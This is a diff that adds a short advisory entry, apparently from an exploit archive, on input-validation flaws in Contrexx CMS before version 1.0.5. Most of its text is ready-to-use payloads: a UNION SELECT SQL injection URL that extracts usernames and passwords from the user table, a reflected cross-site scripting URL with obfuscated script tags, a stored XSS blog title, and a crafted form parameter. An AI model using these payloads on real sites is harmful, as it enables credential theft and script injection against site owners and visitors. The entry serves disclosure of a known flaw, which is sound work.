@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/14352/info
+
+Contrexx is affected by multiple input validation vulnerabilities. These issues can allow an attacker to carry out HTML injection, SQL injection and information disclosure attacks.
+
+Contrexx versions prior to 1.0.5 are affected. 
+
+supply the 'votingoption' parameter as value="1 /*!50030%20s*/" and submit the form.
+
+/index.php?section=gallery&cmd=showCat&cid=41&pId=1%20/**/UNION/**/%20/**/SELECT/**/%201,1,CONCAT(username,'-',password),1,1,1%20/**/FROM%20contrexx_access_users
+
+/index.php?section=search&term=%22%3E%3Cscr\ipt%3Ealert(%22xss%22)%3C/sc\ript%3E
+
+Create a blog entry with the title <script>alert('xss')</script> 
